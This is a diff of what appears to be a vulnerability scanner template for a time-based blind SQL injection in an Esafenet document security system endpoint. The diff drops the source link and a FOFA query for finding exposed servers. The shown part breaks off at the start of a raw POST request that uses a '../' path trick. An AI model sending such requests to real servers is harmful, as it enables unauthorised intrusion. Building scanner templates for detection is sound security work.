@@ -3,14 +3,8 @@ info:
   name: 亿赛通电子文档安全管理系统SaveCDGPermissionFromGFOA存在SQL注入漏洞_vbp2fegafa8nm4rc
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/
-
-    [!] 推断说明: 时间盲注: 命中条件为推断(duration>=5s), 请按实际 payload 延时核验。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  description: '[!] 推断说明: 时间盲注: 命中条件为推断(duration>=5s), 请按实际 payload 延时核验。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
   tags: sqli,unknown
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: ''
-    fofa: app="亿赛通-电子文档安全管理系统"
 http:
 - raw:
   - 'POST /CDGServer3/js/../SaveCDGPermissionFromGFOA HTTP/1.1
